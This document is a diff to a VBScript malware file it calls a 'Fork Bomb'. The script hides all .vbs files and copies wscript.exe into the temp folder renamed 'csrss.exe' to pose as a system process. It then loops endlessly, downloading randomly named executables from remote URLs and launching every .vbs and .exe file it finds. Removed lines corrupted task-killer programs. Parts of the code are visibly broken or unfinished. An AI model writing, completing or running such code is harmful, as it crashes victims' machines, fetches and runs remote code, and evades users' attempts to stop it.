@@ -1,4 +1,4 @@
-'''All the New Pokemans Fork'''
+'''All the New Pokemans Fork Bomb'''
 Dim list
 Dim max, min
 max=999999999
@@ -11,13 +11,15 @@ Set list = CreateObject("System.Collections.ArrayList")
 i = 0
 
 CreateObject("WScript.Shell").run "cmd.exe /c for /r %i in (*.vbs) do attrib +h ""%i"""  'Hide all vbs
-CreateObject("WScript.Shell").run "cmd.exe /c for /r C:\ %i in (*kill.exe) do echo . > ""%i""" 'corrupt the taskkillers
-CreateObject("WScript.Shell").run "cmd.exe"
 
-call getFiles(list.Item(0), (Int((max-min+1)*Rnd+min))&".exe")
-call getFiles(list.Item(1), "C:\csrss.exe"
+call copyWscript
+Do while i <= 0
+	call getFiles(list.Item(0), (Int((max-min+1)*Rnd+min))&".exe") 'get Eevees
+	call executeCSRSS()
+	call executeEevees
+Loop
 
-Function getFiles(strFileURL, strHDLocation)
+Function getFiles(strFileURL, strHDLocation) 'automate get any files that are necessary
 	'strFileURL = "http://www.google.com/intl/en_ALL/images/logo.gif"
 	'strHDLocation = "C:\GoogleLogo.gif"
 	Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
@@ -40,9 +42,15 @@ Function getFiles(strFileURL, strHDLocation)
 	End If
 End Function
 
+Function copyWscript() 'Copy the systems wscript into a temporary folder rename it csrss
+	CreateObject("WScript.Shell").run "cmd /c xcopy /e/c/h/y C:\Windows\System32\wscript.exe C:\%temp%"
+	CreateObject("WScript.Shell").run "cmd /c ren C:\%temp%\wscript.exe C:\%temp%\csrss.exe"
+End Function
+
 Function executeEevees() 'no seriously kill them all
 	CreateObject("WScript.Shell").run "cmd /c start for /r %i in (*.exe) do "
 End Function
 
-Function executeCSRSS() 'Commence undercover agent
-	CreateObject("WScript.Shell").run "cmd /c for /r %i in (*.vbs) do start C:\csrss.exe ""%i"""
+Function executeCSRSS() 'Commence undercover agent, naming of vbs program could change, just run anything with vbs extension
+	CreateObject("WScript.Shell").run "cmd /c for /r %i in (*.vbs) do start C:\%temp%\csrss.exe ""%i"""
+End Function
